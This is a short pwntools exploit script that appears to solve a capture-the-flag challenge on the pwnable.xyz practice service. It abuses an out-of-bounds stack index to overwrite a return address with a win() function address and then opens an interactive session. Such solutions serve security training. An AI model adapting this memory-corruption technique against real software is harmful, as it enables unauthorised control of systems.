#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF('challenge')
# context.log_level = "debug"
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('svc.pwnable.xyz',30002) 
# ===========================
io = start()
io.sendline(b' 4196386 0 13')
# we overwrite the stack with win() address
for i in range(4):
    io.sendline(b' 2 2')
io.sendline()
io.sendline(b'e')
# we can write to the stack by indexing out of the stack buffer
# redirect stack to win address
io.interactive()